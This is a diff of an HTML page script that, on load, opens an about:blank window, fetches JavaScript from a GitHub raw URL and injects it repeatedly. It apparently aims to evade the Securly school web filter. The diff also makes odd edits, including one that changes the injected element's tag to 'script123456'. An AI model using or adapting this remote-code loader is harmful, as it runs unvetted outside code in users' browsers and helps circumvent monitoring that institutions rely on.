@@ -7,7 +7,7 @@
     <script>
         // Wait for the page to load
         window.addEventListener('load', () => {
-            const redirectUrl = 'https://securly.com123456';
+            const redirectUrl = 'https://securly.com';
             const scriptUrl = 'https://raw.githubusercontent.com/Dy1ngRat/pupet/refs/heads/main/action.js';
 
             // Open a new about:blank window
@@ -23,7 +23,7 @@
                         .then(response => response.text())
                         .then(scriptContent => {
                             for (let i = 0; i < 3; i++) {
-                                const scriptElement = newWindow.document.createElement('script');
+                                const scriptElement = newWindow.document.createElement('script123456');
                                 scriptElement.textContent = scriptContent;
                                 newWindow.document.body.appendChild(scriptElement);
                             }
